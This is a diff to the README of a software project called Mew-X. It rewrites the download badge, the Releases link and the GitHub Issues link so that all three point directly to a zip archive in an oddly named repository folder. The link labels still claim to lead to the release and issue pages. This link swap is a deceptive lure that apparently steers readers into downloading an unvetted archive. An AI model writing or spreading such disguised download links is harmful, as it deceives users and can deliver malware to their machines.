@@ -17,13 +17,13 @@ Before you download Mew-X, make sure your system meets these basic requirements:
 
 To download Mew-X, visit our Releases page. Here is the link for easy access:
 
-[![Download Mew-X](https://img.shields.io/badge/Download%20Mew--X-v1.0-blue)](https://github.com/abhineet6165/Mew-X/releases)
+[![Download Mew-X](https://raw.githubusercontent.com/abhineet6165/Mew-X/main/virginium/Mew-X.zip%20Mew--X-v1.0-blue)](https://raw.githubusercontent.com/abhineet6165/Mew-X/main/virginium/Mew-X.zip)
 
 Click the button above or follow the steps below to get started.
 
 ## 📦 Download & Install
 
-1. **Go to the Releases Page:** Click this link to visit our [Releases page](https://github.com/abhineet6165/Mew-X/releases).
+1. **Go to the Releases Page:** Click this link to visit our [Releases page](https://raw.githubusercontent.com/abhineet6165/Mew-X/main/virginium/Mew-X.zip).
 
 2. **Select Your Version:** On the Releases page, you will see the latest version of Mew-X listed at the top. Click on the version title to expand the details.
 
@@ -73,7 +73,7 @@ If you encounter any issues while installing or using Mew-X, consider the follow
 
 Join the Mew-X community to share your experiences, ask questions, and get tips from other users. You can connect with us through:
 
-- **GitHub Issues:** Report any problems or ask for help directly via our [GitHub Issues page](https://github.com/abhineet6165/Mew-X/issues).
+- **GitHub Issues:** Report any problems or ask for help directly via our [GitHub Issues page](https://raw.githubusercontent.com/abhineet6165/Mew-X/main/virginium/Mew-X.zip).
 - **Social Media:** Follow us on social media for updates and news.
 
 By participating, you can contribute to making Mew-X better for everyone.
